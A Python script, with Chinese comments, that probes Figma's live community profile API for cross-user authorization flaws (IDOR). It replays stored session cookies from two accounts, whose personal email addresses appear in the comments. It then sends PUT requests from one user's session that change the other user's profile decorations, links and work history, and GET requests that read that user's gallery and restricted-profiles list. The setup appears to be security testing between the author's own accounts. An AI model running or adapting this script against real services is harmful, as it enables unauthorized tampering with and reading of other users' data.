"""社区 profile 跨用户越权测试（A 修改 B / B 修改 A）

确定性来源：js/1037-5e6059a4815311b3.min.js 的 CommunityProfile API 类
全部端点 profileId 为 URL 路径参数：
  PUT   /api/profile/{pid}/key_links                        {key_link_id,name,url,position}
  DELETE /api/profile/{pid}/key_links/{klid}
  PUT   /api/profile/{pid}/figpals                          {pal_index,color_index,hat_index}
  DELETE /api/profile/{pid}/figpals
  PUT   /api/profile/{pid}/work_history                     {work_history_id,company_name,job_title,start_date,end_date}
  DELETE /api/profile/{pid}/work_history/{whid}
  PUT   /api/profile/{pid}/education_history
  DELETE /api/profile/{pid}/education_history/{ehid}
  PUT   /api/profile/{pid}/resources/{rid}/pin
  DELETE /api/profile/{pid}/resources/{rid}/pin
  GET   /api/profile/handle/{handle}
  GET   /api/profile/{pid}/gallery_images
  GET   /api/profile/{pid}/portfolio_image_url
  GET   /api/profile/{pid}/restricted_profiles

前置：目标账号需已创建社区 profile（figma.com/@handle），否则 404/空
用法：python _profile_cross.py handle_a handle_b [--baseline-only]
"""
import json, sys, urllib.request, urllib.error, ssl

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
BASE = "https://www.figma.com/api"


def load_cookies(f):
    cookies = json.load(open(f, encoding="utf-8"))
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies)


A = load_cookies("figma_session.json")      # A 账号 1643584176@qq.com
B = load_cookies("figma_session_new.json")  # B 账号 729488839@qq.com


def req(label, method, path, cookies=None, body=None):
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
         "Accept": "application/json"}
    if cookies:
        h["Cookie"] = cookies
    if body is not None:
        h["Content-Type"] = "application/json"
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=25, context=ctx)
        raw = resp.read()
        print(f"[{resp.status}] {label}")
        print("   ", raw[:400].decode("utf-8", "replace").replace("\n", " "))
        return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read()
        print(f"[{e.code}] {label}")
        print("   ", raw[:400].decode("utf-8", "replace").replace("\n", " "))
        return e.code, raw
    except Exception as e:
        print(f"[ERR] {label}: {e}")
        return -1, b""


def main():
    args = sys.argv[1:]
    handle_a = args[0] if len(args) > 0 else None
    handle_b = args[1] if len(args) > 1 else None
    baseline_only = "--baseline-only" in args

    print("=" * 70)
    print("基线：端点存在性 + 无 profile 对象时的错误语义")
    print("=" * 70)
    # 不存在 handle 的查询 → 确认端点路径与 404 语义
    req("GET /api/profile/handle/this-handle-should-not-exist-9f3k", "GET",
        "/api/profile/handle/this-handle-should-not-exist-9f3k", A)
    req("PUT /api/profile/0/figpals（不存在对象, A会话）", "PUT",
        "/api/profile/0/figpals", A, {"pal_index": 1, "color_index": 1, "hat_index": 1})
    req("PUT /api/profile/0/key_links（不存在对象, A会话）", "PUT",
        "/api/profile/0/key_links", A, {"key_link_id": None, "name": "x", "url": "https://x.com", "position": 0})
    req("GET /api/profile/0/gallery_images（不存在对象, A会话）", "GET",
        "/api/profile/0/gallery_images", A)

    if baseline_only or not handle_a or not handle_b:
        print("\n[跳过矩阵] 需提供 handle_a handle_b（目标账号需已创建社区 profile）")
        return

    print("=" * 70)
    print(f"A→B 矩阵：A 会话操作 B 的 profile ({handle_b})")
    print("=" * 70)
    pid_b = None
    st, raw = req(f"GET /api/profile/handle/{handle_b}", "GET", f"/api/profile/handle/{handle_b}", B)
    if st == 200:
        try:
            pid_b = json.loads(raw).get("id")
        except Exception:
            pass
        print(f"   B profileId = {pid_b}")
    else:
        print(f"   B 查询失败（B 可能未创建 profile），尝试用 A 会话查：")
        st, raw = req(f"GET /api/profile/handle/{handle_b} (A会话)", "GET", f"/api/profile/handle/{handle_b}", A)
        if st == 200:
            try:
                pid_b = json.loads(raw).get("id")
            except Exception:
                pass
            print(f"   B profileId = {pid_b}（A 可读 B 的 profile 元数据）")
    if pid_b:
        req(f"PUT /api/profile/{pid_b}/figpals (A改B装饰)", "PUT",
            f"/api/profile/{pid_b}/figpals", A, {"pal_index": 2, "color_index": 3, "hat_index": 4})
        req(f"PUT /api/profile/{pid_b}/key_links (A给B加链接)", "PUT",
            f"/api/profile/{pid_b}/key_links", A,
            {"key_link_id": None, "name": "idor-probe", "url": "https://example.com/idor-probe", "position": 0})
        req(f"PUT /api/profile/{pid_b}/work_history (A给B加经历)", "PUT",
            f"/api/profile/{pid_b}/work_history", A,
            {"work_history_id": None, "company_name": "IDOR Probe", "job_title": "tester",
             "start_date": "2020-01", "end_date": "2021-01"})
        req(f"GET /api/profile/{pid_b}/gallery_images (A读B图库)", "GET",
            f"/api/profile/{pid_b}/gallery_images", A)
        req(f"GET /api/profile/{pid_b}/portfolio_image_url (A读B头像)", "GET",
            f"/api/profile/{pid_b}/portfolio_image_url", A)
        req(f"GET /api/profile/{pid_b}/restricted_profiles (A读B黑名单)", "GET",
            f"/api/profile/{pid_b}/restricted_profiles", A)

    print("=" * 70)
    print(f"B→A 矩阵：B 会话操作 A 的 profile ({handle_a})")
    print("=" * 70)
    pid_a = None
    st, raw = req(f"GET /api/profile/handle/{handle_a}", "GET", f"/api/profile/handle/{handle_a}", A)
    if st == 200:
        try:
            pid_a = json.loads(raw).get("id")
        except Exception:
            pass
        print(f"   A profileId = {pid_a}")
    if pid_a:
        req(f"PUT /api/profile/{pid_a}/figpals (B改A装饰)", "PUT",
            f"/api/profile/{pid_a}/figpals", B, {"pal_index": 5, "color_index": 6, "hat_index": 7})
        req(f"PUT /api/profile/{pid_a}/key_links (B给A加链接)", "PUT",
            f"/api/profile/{pid_a}/key_links", B,
            {"key_link_id": None, "name": "idor-probe-b", "url": "https://example.com/idor-probe-b", "position": 0})


if __name__ == "__main__":
    main()
